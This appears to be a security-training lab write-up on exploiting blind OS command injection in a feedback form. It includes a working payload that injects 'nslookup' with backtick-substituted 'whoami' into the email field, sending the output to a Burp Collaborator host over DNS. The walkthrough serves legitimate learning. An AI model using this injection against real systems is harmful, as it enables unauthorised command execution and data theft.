# Lab 05: Blind OS Command Injection with Data Exfiltration

### 🎯 Objective
Exploit a blind OS command injection vulnerability to execute the `whoami` command and exfiltrate the output via a DNS query to Burp Collaborator.

### 🔍 Vulnerability Analysis
The application's feedback function is vulnerable to asynchronous blind OS command injection. Since we cannot see the output directly or write to a file, we use **Out-of-Band (OOB)** data exfiltration. By nesting a command inside a DNS lookup, the server will evaluate the command and prepend the result as a subdomain in the DNS request sent to our Collaborator server.

### 🛠️ Exploitation Steps

1.  **Prepare Collaborator:**
    I generated a unique Burp Collaborator payload (e.g., `xyz.oastify.com`).

2.  **Inject the Exfiltration Payload:**
    I intercepted the feedback submission request and injected a command into the `email` parameter using backticks (`` ` ``) for command substitution.
    
    **Modified Payload:**
    `email=x||nslookup+`whoami`.YOUR-COLLABORATOR-ID.oastify.com||`
    
    * `whoami`: Executes the command.
    * `` `whoami` ``: The backticks ensure that the shell executes `whoami` first and places its output into the `nslookup` string.
    * `...oastify.com`: The final DNS query will look like `peter-G7vX2L.xyz.oastify.com`.

3.  **Capture the Data:**
    I returned to the Burp Collaborator tab and clicked **"Poll now"**. A DNS interaction appeared. In the "Description" or "Request" tab of the interaction, the full domain name revealed the username:
    
    * **Full Hostname:** `peter-[REDACTED].xyz.oastify.com`
    * **Extracted User:** `peter-[REDACTED]`

4.  **Finalize:**
    I submitted the extracted username to the lab's "Submit solution" button.

### 🚩 Result
- **Captured User:** `peter-G7vX2L` (specific to the lab session)
- **Evidence:** Data received via DNS subdomain resolution in Burp Collaborator.
- **Status:** ✅ Solved
